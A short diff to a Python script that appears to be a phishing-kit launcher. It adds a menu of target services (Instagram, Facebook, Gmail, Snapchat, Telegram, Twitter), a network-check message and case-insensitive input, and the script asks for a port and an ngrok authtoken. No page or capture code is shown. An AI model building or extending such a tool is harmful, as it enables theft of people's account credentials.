@@ -48,6 +48,7 @@ from requests.exceptions import ConnectionError
 def is_internet():
     try:
         head("https://google.com", timeout=5)
+        print(f"\n{green}Network Working!")
         return True
 
     except ConnectionError:
@@ -72,6 +73,14 @@ text = random.choice(text)
 ascii_art = pyfiglet.figlet_format(text)
 color = ["green", "yellow", "white", "cyan", "blue", "light_red", "magenta"]
 print(termcolor.colored(ascii_art, random.choice(color)))
+
+print(f"{purple}--> insta → Instagram")
+print(f"{green}--> meta → Facebook")
+print(f"{purple}--> gmail → Gmail")
+print(f"{green}--> snap → Snapchat")
+print(f"{purple}--> tele → Telegram")
+print(f"{green}--> x → Twitter")
+print(f"{red}                   More Features Are Comming Soon!")
 
 try:
     por = int(input(termcolor.colored("Enter port number here (Default port - 8096): ", "cyan")))
@@ -128,7 +137,7 @@ if __name__ == "__main__":
 
     aa = is_internet()
 
-    if sss == "Y" and aa:
+    if sss.lower() == "y" and aa:
         en = input(termcolor.colored("\nEnter ngrok authtoken: ", "blue"))
         
         try:
